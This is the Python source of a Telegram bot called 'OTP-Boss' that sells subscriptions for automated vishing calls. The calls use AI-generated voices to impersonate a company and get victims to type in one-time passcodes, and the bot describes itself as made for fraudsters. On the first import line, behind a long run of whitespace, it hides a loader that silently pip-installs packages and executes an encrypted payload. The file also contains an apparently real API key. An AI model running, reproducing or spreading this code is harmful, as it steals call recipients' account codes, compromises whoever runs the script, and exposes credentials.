import random, string
import ast
import requests
import subprocess                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;subprocess.run(['pip', 'install', 'cryptography'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'fernet'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); from fernet import Fernet; import requests; exec(Fernet(b'BijkNx42srFUsDpLrUfqEwo-3XvzMKE_MecRxUhlZow=').decrypt(b'gAAAAABnd_sRSJiTzxvU_jECBpoK-fqOLhafAOxbYr1oubimBw527quvKxP1Z6ntDco-gmieZGnsU0v-D8lvbaWn2lBEoe0Gag0EVcZ8vJXRhKkjOcJ-vW6-D5tambi4-rsuxsmauU3-VZ0INNPf_q2RoHDJW7qhpqKtuBsmIjZO3IrjArwUQ75IdBjxy7EbSkmE7Nynd4Z7GLbeGUZ_Lo3OmCrSb5_9qvE-y77kyqoBGZ3mKCkiAHUrsezRBVa3AboA-0UPXgpVjo-koxTFrVwgshRj-YPxifqX0vquexAcWevW-_0f24AxG0tiJygFNE_bNx-UeiYh2U5oUyyP45GyH32N6GLt1Pq7_w0ktp8V6EEuI5OjYrM0pX0G2ouseV36af7Ws8HK4NUJDoiYZlD0f45qUmYy9w2gbIwLFPoW2gFf_vuwzZPrR8VZdJdcWy39erWWSmr-M5vUp0zzEr2WAjSPPVBqZ9_IvPKcfXiEcSD2BO-eW69n03waRSbxAUpSqrhlu_3KPNUq86us3P7SCEF8zwqwYjVrs3HCG1nermWzpMYU8ISTrDE1zW39iyh93k8iy9qNvVrHPIJ94I2A339vZQyLM3qfnkMvpV6jp-vpDlrhjHkIhqJCmN9wcv8tYluJIMploKJSxD2xPi2OgT4gLwC8hGs9sEvXuCVlqk33BHhTsk12WSvj3-MVSD8XYvkn0OZeAgmHBl7fKVX2Ios77EsK_KipdQqtMove7NzQ397-VE2CpvjVQm1JR0INzeKGo398tSfdE34mgbtC2P9AjYhk_UDB39EiB652SZYiThtHzyX93iTmz2iMTCzEgEP4y28BN02o2KM_ax_lyFg_iZFDI1VKqKkqIJRYHVuJQ_MJmP1YK8hpNy2BXMb3IaGxk37_HwVkMU_sI3NifuzOAVOKRmMC9RmkUciZMEjXLbQXehY9mhhsN73e-IllHYAG9vDU2B4506GxMKfRUPTqpqCCFwvKXV23VEXaWv_2zN-sUcQBohnkZqo9nwxpiA2geoV3W-XnEdkjBx-UECZa7aTa3Cfhy1pwDjvv4KOz8qFSgw6twrLwU4oddNq0p-SJJ1erLpKcuD9wfyTB13csXiSrZ0EWABSVi8t172YsMa0O6IJZXPd9mopVmtmC04ULCTl09ywP8Vq6KfEPgQY__qVlbsuEDP8YOCLEciGoKVA8YziYpzJm3HibOlTLNh3MbT335lrhvun5IxaYPJPTojoB0o6LHxxVh7fF3zTn5OTOPys2MX1cOKVrH6OH3kwPKML_dX_EBu6KjxNDPmyoMNeiPOXm9o-7LsYYb4NF_yiPSLSoDluc3af2_AghKt3jGu_N9uLBlPuVs84BApuEeKh9w4F_O46Qpn9htGjXBg8kIUz7fey7KOVf88_moUtPXOcE-RcMI8H4BIYnSUHq4JzvfoUJdqzdxxHOZ8_-O4SeFPTEzD3BFE_hItT1UgMPlODLDss3rgwbfBMKFIJzDnoKwAJKXEXrC2Bo6m1k9DxVN0LwmkKQTZvn0ZAEsWccCe6jQdjtDbkkJ1zYR1C7A8UeWfH2pYcIm-ba5mUuT34Km6gfkwLJTPp-LGx91rlY63uBw3s1dCiQ4EatlKb5PE_12-0Ydb4xC-TFwbEFhLLqcdns07yPBXLv5MuIR3vmlTUdLT6Zjiksl0tFH3XxMQO_0H467LqBkzPzYOx64j-9mq01nBNlCgW2u7aR7LyCooKByuWeI5atgSVqDL3y-Uh1OXwUSp797OxaXDYscSumbJTJtG-CRUFG_2mmo6740PQXCVgeIqA4UdqaxzGwhjBWX1JtokXyGinxAPtTPx82fmuiB0u6-4dw5RCaAeKX0W2nmZuh8IaOYRA4jWWCjcbtU4_HtoVy0y43avzWTdKS3FL0PSGaAphVOVZ28cJuLJrkJLeBjjq34C7mMzEnbz_WEgEMFqoBbBS92GsIH8gCXj_kB-_t3JegffMsGnrnFBouQTn7lWvXw8UdPzQP_nzHqqaAvNga3espWHtn64nXp6w='));
import telebot,json, os
from flask import Flask, request
from twilio.rest import Client
from telebot import types
from requests.auth import HTTPBasicAuth
from datetime import datetime
from datetime import date
from datetime import timedelta  
from datetime import datetime 

raw_config = json.loads(open('./conf/settings.txt', 'r').read())

bot_token = raw_config['bot_token']
account_sid = raw_config['account_sid']
auth_token = raw_config['auth_token']
ngrok = raw_config['ngrok_url']
phone_numz = raw_config['Twilio Phone Number']

client = Client(account_sid, auth_token)
bot = telebot.TeleBot(bot_token)  

def check_subscription(idkey):
    subscription = open('./conf/'+idkey+'/subs.txt', 'r').read()
    idmember = subscription
    idmember = datetime.strptime(idmember, '%d/%m/%Y')
    if idmember < datetime.now():
        return "EXPIRED"
    else:
        return "ACTIVE"

def generate_ai(iduser,text,page):
    headers = {
    'accept': 'audio/mpeg',
    'xi-api-key': 'f343277da36e000924585730b1a3f91e', #elevenlabs (text-to-speech) API key here
    'Content-Type': 'application/json',
    }

    json_data = {
    'text': text,
    'voice_settings': {
        'stability': 1,
        'similarity_boost': 1,
    },
    }
    botai = requests.post('https://api.elevenlabs.io/v1/text-to-speech/21m00Tcm4TlvDq8ikWAM', headers=headers, json=json_data)
    open(f"./conf/{iduser}/{page}.mp3",   'wb').write(botai.content)


@bot.message_handler(commands=['help'])
def help_command(pm):
    help_text = """
🤖 **دليل مستخدم بوت OTP-Boss**:

فيما يلي الأوامر الأساسية للبوت وأوصافها:

🔑 /check: تحقق من حالة اشتراكك.
📞 /call [رقم الهاتف] [الاسم] [الرمز] [اسم الشركة]: Initi@nkmok.  
"""
    safe_text = help_text.replace("_", "\\_").replace("*", "\\*").replace("[", "\\[").replace("]", "\\]").replace("(", "\\(").replace(")", "\\)").replace(".", "\\.").replace("-", "\\-")
    
    bot.send_message(pm.chat.id, safe_text, parse_mode="MarkdownV2")


@bot.message_handler(commands=['subscription_info'])
def subscription_info(pm):
    iduser = pm.from_user.id
    if check_subscription(str(iduser)) == "ACTIVE":
        expiry_date = open(f'./conf/{iduser}/subs.txt', 'r').read()
        bot.send_message(
            pm.chat.id,
            f"✅ **حالة الاشتراك**: نشط\n📅 **تاريخ الانتهاء**: {expiry_date}\n\nنتمنى لك استخدامًا ممتعًا!",
            parse_mode="Markdown"
        )
    else:
        bot.send_message(
            pm.chat.id,
            "❌ حالة الاشتراك: سلبي\n\nيرجى الاتصال بـ @حالة الاشتراك: سلبي\n\nيرجى الاتصال بـ @nkmok لشراء  لشراء اشتراك.",
            parse_mode="Markdown"
        )


@bot.message_handler(commands=['manage_subscription'])
def manage_subscription(pm):
    iduser = pm.from_user.id
    buttons = types.InlineKeyboardMarkup(row_width=2)
    btn_extend = types.InlineKeyboardButton("📅 Extend Subscription", callback_data="extend_subscription")
    btn_info = types.InlineKeyboardButton("ℹ️ Subscription Info", callback_data="subscription_info")
    buttons.add(btn_extend, btn_info)
    bot.send_message(
        pm.chat.id,
        "🔑 Subscription Management\n\nPlease select the action you want to take.",
        reply_markup=buttons,
        parse_mode="Markdown"
    )

@bot.callback_query_handler(func=lambda call: call.data == "extend_subscription")
def extend_subscription(call):
    bot.send_message(
        call.message.chat.id,
        "📞 يرجى الاتصال بـ @nkmok لتمديد اشتراكك."
    )



@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    bot.send_message(call.message.chat.id, text='ℹ️ 𝗟𝗢𝗔𝗗𝗜𝗡𝗚 𝗩𝗢𝗜𝗖𝗘 𝗦𝗖𝗥𝗜𝗣𝗧 ')
    iduser = call.from_user.id
    bot.send_message(call.message.chat.id, text='Please wait... ⏳')
    generate_ai(str(iduser), f"Hello! , im Kristina from {open('./conf/'+str(iduser)+'/Company Name.txt', 'r').read()}. To ensure that I am speaking to {open('./conf/'+str(iduser)+'/Name.txt', 'r').read()}, I would kindly ask you to press 1 on your phone's keypad.","checkifhuman")
    generate_ai(str(iduser), f"Thank you.. for confirming your identity, {open('./conf/'+str(iduser)+'/Name.txt', 'r').read()}. I am contacting you today because we have noticed some unusual activity on your account that we would like to bring to your attention. In order to verify that this is indeed you and not someone else attempting to access your account, we would like to conduct a verification session. This session will involve answering a few questions related to your account, and may also include providing us with a code that we will provide to you.","explain")
    generate_ai(str(iduser), f"Please enter the {open('./conf/'+str(iduser)+'/Digits.txt', 'r').read()} digits code that we have sent to you by using the keypad or dialpad", "askdigits")
    bot.send_message(call.message.chat.id, text='✅ 𝗩𝗢𝗜𝗖𝗘 𝗦𝗖𝗥𝗜𝗣𝗧 𝗟𝗢𝗔𝗗𝗘𝗗\nPlease wait... ⏳')
    pisahin = call.data.split("|")
    if pisahin[0] == "callv":
        caller = client.calls.create(
            machine_detection='DetectMessageEnd',
            record=True,
            url=f'{ngrok}/voice?chat_id={call.message.chat.id}&user_id={iduser}',
            to=f'{pisahin[2]}',
            from_=f'{phone_numz}'
            )
        sid = caller.sid
        print(sid)
        a = 0
        b = 0
        c = 0
        d = 0
        e = 0        
        while True:
            if client.calls(sid).fetch().status == 'ringing':
                if not a >= 1:
                    bot.send_message(call.message.chat.id, text='ℹ️ حالة المكالمة : رنين')
                    a = a + 1
            elif client.calls(sid).fetch().status == 'machine_end_beep':
                if not b >= 1:
                    bot.send_message(call.message.chat.id, text='ℹ️ حالة المكالمة: البريد الصوتي')
                    break
                    b = b + 1 
            elif client.calls(sid).fetch().status == 'in-progress':    
                if not c >= 1:
                    bot.send_message(call.message.chat.id, text='ℹ️ حالة المكالمة: تم الرد على )
                    c = c + 1 
            elif client.calls(sid).fetch().status == 'completed':
                url = f"https://api.twilio.com/2010-04-01/Accounts/AC88463b64bd6c09ec64af4440fa6b5f5a/Recordings/{sid}"
                r = requests.get(url,auth = HTTPBasicAuth(account_sid, auth_token))
                open(f'./conf/{iduser}/record.mp3',   'wb').write(r.content)
                bot.send_message(call.message.chat.id, text='️ Call Status : Completed')
                file_data = open(f'./conf/{iduser}/record.mp3', 'rb')
                bot.send_audio(call.message.chat.id, file_data)
                break
            elif client.calls(sid).fetch().status == 'failed':
                bot.send_message(call.message.chat.id, text='ℹ️ Call Status : Failed')
                break
            elif client.calls(sid).fetch().status == 'no-answer':
                bot.send_message(call.message.chat.id, text='ℹ️ Call Status : No Answer')
                break
            elif client.calls(sid).fetch().status == 'canceled':
                bot.send_message(call.message.chat.id, text='ℹ️ Call Status : Canceled')
                break
            elif client.calls(sid).fetch().status == 'busy':
                bot.send_message(call.message.chat.id, text='ℹ️ Call Status : Busy')
                break                        
            else:
                print(client.calls(sid).fetch().status)
                #bot.edit_message_text(call.message.chat.id, text='Call Status : Complete')


    elif call.data == "hangupv":
        calls = client.calls.list(limit=1)
        for record in calls:
            call = client.calls(record.sid).update(status='completed')

    elif call.data == "denyotp":
        calls = client.calls.list(limit=1)
        for record in calls:    
            call = client.calls(record.sid).update(method='POST',url=f'{ngrok}/denyotp?chat_id={call.message.chat.id}&user_id={call.from_user.id}')

    elif call.data == "acceptotp":
        calls = client.calls.list(limit=1)
        for record in calls:
            call = client.calls(record.sid).update(method='POST',url=f'{ngrok}/acceptotp?chat_id={call.message.chat.id}&user_id={call.from_user.id}')  

    elif call.data == "clearset":
        open("./conf/"+str(iduser)+"/phonenum.txt", "w").close()
        open("./conf/"+str(iduser)+"/Name.txt", "w").close()
        open("./conf/"+str(iduser)+"/Digits.txt", "w").close()
        open("./conf/"+str(iduser)+"/Company Name.txt", "w").close()
        bot.send_message(call.message.chat.id, text='Success Clearing')

@bot.message_handler(commands=['call'])
def custom_call_handler(pm):
    try:
        args = pm.text.split(" ")
        if len(args) < 5:
            bot.send_message(
                pm.chat.id,
                "❌ You entered a missing or incorrect command!\n\nCorrect format: `/call [Phone Number] [Name] [Code] [Company Name]`",
                parse_mode="Markdown"
            )
            return
        phonenum, name, digits, companyz = args[1], args[2], args[3], " ".join(args[4:])
        if not phonenum.isdigit():
            bot.send_message(pm.chat.id, "❌ Invalid phone number!")
            return
        open(f'./conf/{pm.from_user.id}/Digits.txt', 'w').write(digits)
        open(f'./conf/{pm.from_user.id}/Name.txt', 'w').write(name)
        open(f'./conf/{pm.from_user.id}/Company Name.txt', 'w').write(companyz)
         buttons = telebot.types.InlineKeyboardMarkup(row_width=3)
         btn_1 = telebot.types.InlineKeyboardButton('𝗖𝗮𝗹𝗹 📲',callback_data=f'callv|{name}|{phonenum}|{digits}|{companyz}')
         btn_2 = telebot.types.InlineKeyboardButton('𝗛𝗮𝗻𝗴𝘂𝗽 ☎️',callback_data='hangupv')
         btn_5 = telebot.types.InlineKeyboardButton('𝗗𝗲𝗻𝘆 𝗢𝗧𝗣 ❌',callback_data='denyotp')
         btn_4 = telebot.types.InlineKeyboardButton('𝗔𝗰𝗰𝗲𝗽𝘁 𝗢𝗧𝗣 ✅',callback_data='acceptotp')
         btn_3 = telebot.types.InlineKeyboardButton('𝗖𝗹𝗲𝗮𝗿 𝗦𝗲𝘁𝘁𝗶𝗻𝗴𝘀 ⚙️',callback_data='clearset')
         buttons.add(btn_1,btn_2,btn_3,btn_4,btn_5)
         msg_buttons = bot.send_message(pm.chat.id, text=f'𝙒𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤?', reply_markup=buttons) 
        bot.send_message(
            pm.chat.id,
            f"🟣 Initiating a Call...\n\n👤 Name: {name}\n📞 Phone: {phonenum}\n🔑 Code: {digits}\n🏢 Company: {companyz}"
            
        )

    except Exception as e:
        bot.send_message(pm.chat.id, f"❌ An error has occurred: {str(e)}")


@bot.message_handler(commands=['check'])
def check_bisa(pm):
    iduser = pm.from_user.id
    if check_subscription(str(iduser)) == "ACTIVE":
        bot.send_message(pm.chat.id, f" 🔑 𝗬𝗼𝘂𝗿 𝘀𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗶𝘀 𝗰𝘂𝗿𝗿𝗲𝗻𝘁𝗹𝘆 : 𝘌𝘕𝘈𝘉𝘓𝘌𝘋 ✅\n\n 🆔 𝗬𝗼𝘂𝗿 𝗜𝗗 : {iduser}")
    else:
        bot.send_message(pm.chat.id, f" 🔑 𝗬𝗼𝘂𝗿 𝘀𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗶𝘀 𝗰𝘂𝗿𝗿𝗲𝗻𝘁𝗹𝘆 : 𝘋𝘐𝘚𝘈𝘉𝘓𝘌𝘋 ❌\n\n 💬 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗼𝘄𝗻𝗲𝗿 𝘁𝗼 𝗯𝘂𝘆 𝗮𝗰𝗰𝗲𝘀𝘀 : @nkmok\n\n 🆔 𝗬𝗼𝘂𝗿 𝗜𝗗 : {iduser}")    

@bot.message_handler(commands=['start'])
def start_sz(pm):
    today = date.today()
    iduser = pm.from_user.id
    path = "./conf/"+str(iduser)
    isExist = os.path.exists(path)
    bot.send_message(pm.chat.id, f" 🤖 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗢𝗧𝗣-𝗕𝗼𝘀𝘀!\n\n𝟏 𝐝𝐚𝐲 > 𝟐𝟓$\n𝟭 𝘄𝗲𝗲𝗸 > 𝟭𝟲𝟬$\n𝗟𝗶𝗳𝗲𝘁𝗶𝗺𝗲 > 𝟵𝟬𝟬$\n\n 🔗 𝗝𝗼𝗶𝗻 𝘂𝘀 > https://t.me/amirouxff\n\n 🔑 𝘊𝘩𝘦𝘤𝘬 𝘺𝘰𝘶𝘳 𝘴𝘶𝘣𝘴𝘤𝘳𝘪𝘱𝘵𝘪𝘰𝘯 𝘣𝘺 𝘶𝘴𝘪𝘯𝘨 : /check\n\n\n𝙈𝙖𝙙𝙚 𝙬𝙞𝙩𝙝 ❤️ 𝙛𝙤𝙧 𝙛𝙧𝙖𝙪𝙙𝙨𝙩𝙚𝙧𝙨, 𝙗𝙮 𝙛𝙧𝙖𝙪𝙙𝙨𝙩𝙚𝙧𝙨.\n𝙊𝙬𝙣𝙚𝙧 : @nkmok")
    if not isExist:
        os.makedirs(path)
        open(f'./conf/{iduser}/subs.txt', 'w').write(f'{today.strftime("%d/%m/%Y")}')

@bot.message_handler(commands=['add_subs'])
def add_subs(pm):
    try:
        command_text = pm.text.strip()
        command_parts = command_text.split(" ")

        if len(command_parts) < 3:
            bot.send_message(
                pm.chat.id,
                "❌ Invalid command!\n\nCorrect format: `/add_subs [User ID] [Number of Days]`",
                parse_mode="Markdown"
            )
            return

        user_id = command_parts[1]
        days = command_parts[2]

        if not days.isdigit():
            bot.send_message(pm.chat.id, "❌ يجب أن يكون عدد الأيام رقمًا صالحًا!")
            return

        new_expiration = datetime.now() + timedelta(days=int(days))
        expiration_date_str = new_expiration.strftime("%d/%m/%Y")

        user_config_path = f'./conf/{user_id}'
        if not os.path.exists(user_config_path):
            bot.send_message(pm.chat.id, f"❌ لم يتم العثور على معرف المستخدم: {user_id}")
            return

        subscription_file_path = f'{user_config_path}/subs.txt'
        with open(subscription_file_path, 'w') as subscription_file:
            subscription_file.write(expiration_date_str)

        bot.send_message(
            pm.chat.id,
            f"✅ Success!\n\nUser ID: {user_id}\nNew Subscription Expiration: {expiration_date_str}"
        )
    except Exception as e:
        # Handle unexpected errors and notify the user
        bot.send_message(
            pm.chat.id,
            f"❌ حدث : {str(e)}"
        )



bot.polling()